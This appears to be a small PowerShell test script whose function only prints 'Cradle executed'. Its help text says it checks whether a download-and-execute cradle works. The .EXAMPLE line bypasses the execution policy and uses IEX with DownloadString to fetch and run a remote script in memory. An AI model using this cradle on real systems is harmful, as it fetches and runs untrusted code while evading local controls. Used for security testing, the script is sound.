function Invoke-Howdy
{
<#
.SYNOPSIS
This function just prints some stuff

.DESCRIPTION
Just a way to test if a non-malicious IEX cradle will work

.EXAMPLE
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/decidedlygray/tmp_payloads/hello.ps1');Invoke-Howdy"

.LINK
https://https://github.com/decidedlygray/tmp_payloads/hello.ps1
https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf
#>

Write-Output "Cradle executed"

}
